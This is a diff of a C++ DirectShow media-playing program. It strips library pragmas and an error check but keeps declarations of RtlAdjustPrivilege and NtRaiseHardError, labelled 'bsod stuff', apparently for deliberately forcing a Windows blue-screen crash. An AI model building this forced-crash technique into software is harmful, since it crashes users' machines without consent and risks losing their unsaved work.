@@ -2,12 +2,6 @@
 #include <dshow.h>
 #include <stdio.h>
 
-// pragmas for libraries needed
-#pragma comment(lib, "ntdll.lib") 		// BSoD stuff
-#pragma comment(lib, "strmiids.lib") 	// most of DirectShow
-#pragma comment(lib, "ole32.lib") 		// CoInitialize and CoCreateInstance
-#pragma comment(lib, "user32.lib")		// ShowWindow
-
 // externs for bsod stuff
 extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
 extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);
@@ -51,10 +45,6 @@ void InitializeDirectShow(LPCWSTR* path) {
 
 	// create the filter graph manager
 	HRESULT result = CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&graph);
-
-	if (FAILED(result)) {
-		printf("error! code 0x%x\n", result);
-	}
 
 	// get all needed addition interfaces
 	graph->QueryInterface(IID_IMediaControl, (void**)&control);
